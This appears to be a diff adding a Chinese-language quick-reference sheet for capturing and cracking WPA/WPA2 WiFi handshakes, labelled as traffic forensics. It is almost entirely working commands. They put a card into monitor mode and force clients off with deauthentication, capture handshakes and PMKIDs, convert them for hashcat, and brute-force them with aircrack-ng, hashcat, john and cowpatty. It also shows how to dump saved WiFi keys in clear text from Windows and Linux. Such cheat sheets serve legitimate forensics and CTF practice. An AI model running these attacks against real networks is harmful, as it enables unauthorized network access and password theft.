@@ -1,0 +1,60 @@
+==========================================================================
+ WiFi WPA/WPA2 握手包提取与破解速查（流量取证）
+==========================================================================
+
+【0x01 抓握手】
+  监听网卡:
+    airmon-ng start wlan0              进入监听模式（生成 wlan0mon）
+    airodump-ng wlan0mon               找目标 BSSID/信道 CH
+    airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w cap wlan0mon
+  逼客户端重连（产生 4 次握手）:
+    aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon      发 deauth
+  看到右上角 "WPA handshake: BSSID" 即抓到
+  图形化: wireshark 抓包；Windows 可配合 Acrylic WiFi/外置监听网卡
+
+【0x02 Wireshark 中确认握手】
+  过滤: eapol
+  完整握手: AP->STA(M1)、STA->AP(M2)、AP->STA(M3)、STA->AP(M4)
+  M2+M3 即可跑字典（含 ANonce/SNonce/MIC）
+  过滤: wlan.fcs.status==0 && eapol
+  导出: File->Export Specified Packets，只存 eapol 得到小 cap
+
+【0x03 转换格式】
+  hcxtools（hashcat 推荐 22000 模式）:
+    hcxpcapngtool -o hash.hc22000 cap.cap
+  旧 hcxtools: hcxpcaptool -o hash.txt cap
+  aircrack 格式可直接: cap 文件喂给 aircrack-ng
+  cowpatty 格式: wpaclean out.cap in.cap
+
+【0x04 破解】
+  aircrack-ng:
+    aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF cap.cap
+  hashcat（GPU 快，模式 22000）:
+    hashcat -m 22000 hash.hc22000 rockyou.txt
+    hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d   8 位纯数字
+    --show 查看结果
+  john:
+    john --wordlist=rockyou.txt hash.txt
+  coWPAtty/genpmk（彩虹表，针对固定 SSID）:
+    genpmk -f rockyou.txt -d hash_table -s SSID
+    cowpatty -d hash_table -r cap.cap -s SSID
+
+【0x05 常见坑】
+  - 必须有完整 M1/M2（最好 M1-M4），只有 M4 无法破解
+  - PMKID 攻击（无需客户端）:
+      hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
+      hcxpcapngtool -o hash.hc22000 dump.pcapng
+      hashcat -m 22000
+  - 字典跑不出: 换针对性字典(cupp 生成)、规则(-r rules/best64.rule)
+  - WPA3(SAE)/OWE: 传统握手方式不同，需 hcxtools 新版与对应模式
+  - 企业版 WPA2-Enterprise(802.1x EAP): 破解的是 RADIUS 账号密码，
+    抓 EAP 包用 asleap/eapmd5pass，不是 PSK 路线
+  - SSID 参与 PMK 派生，hashcat 22000 已内置 SSID；老格式别删 SSID
+
+【0x06 相关取证】
+  路由器配置文件(routerpass/RouterScan): 解出无线密码、PPPoE、管理账号
+  Windows 已保存 WiFi:
+    netsh wlan show profiles
+    netsh wlan show profile name="SSID" key=clear
+  Linux: /etc/NetworkManager/system-connections/*
+==========================================================================
